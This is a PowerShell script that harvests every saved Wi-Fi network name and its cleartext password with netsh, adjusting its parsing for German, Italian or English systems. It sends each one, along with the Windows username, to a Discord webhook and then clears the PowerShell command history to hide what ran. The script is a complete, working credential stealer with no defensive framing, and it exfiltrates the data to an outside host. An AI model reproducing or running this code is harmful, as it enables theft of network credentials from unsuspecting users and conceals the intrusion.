# Determine system language
$language = (Get-Culture).TwoLetterISOLanguageName

switch ($language) {
    'de' { # German
        $userProfileString = '(?<=Profil für alle Benutzer\s+:\s).+'
        $keyContentString = '(?<=Schlüsselinhalt\s+:\s).+'
    }
    'it' { # Italian
        $userProfileString = '(?<=Tutti i profili utente\s+:\s).+'
        $keyContentString = '(?<=Contenuto chiave\s+:\s).+'
    }
    default { # Default to English if language is not supported
        $userProfileString = '(?<=All User Profile\s+:\s).+'
        $keyContentString = '(?<=Key Content\s+:\s).+'
    }
}

netsh wlan show profile | Select-String $userProfileString | ForEach-Object {
    $wlan  = $_.Matches.Value
    $passw = netsh wlan show profile $wlan key=clear | Select-String $keyContentString

    $Body = @{
        'username' = $env:username + " | " + [string]$wlan
        'content' = [string]$passw
    }

    # Remove the comments if you want debug it
    #try {
    Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
    #} catch {
    #    Write-Host "Some err: $_"
    #}
}

# Clear the PowerShell command history
Clear-History
